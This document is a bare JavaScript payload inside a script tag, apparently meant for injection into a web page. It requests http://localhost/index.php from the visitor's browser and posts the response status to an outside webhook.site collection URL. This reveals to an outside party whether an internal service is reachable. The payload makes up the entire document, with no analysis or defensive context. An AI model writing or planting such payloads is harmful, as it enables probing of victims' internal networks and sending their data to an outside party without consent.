<script>
var xhr = new XMLHttpRequest();

xhr.open("GET", "http://localhost/index.php", true);

xhr.onload = function () {
    var post = new XMLHttpRequest();

    post.open(
        "POST",
        "https://webhook.site/12ed374b-5d1e-4540-b1a8-60188017421a",
        true
    );

    post.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
    );

    post.send("status=" + xhr.status);
};

xhr.send();
</script>
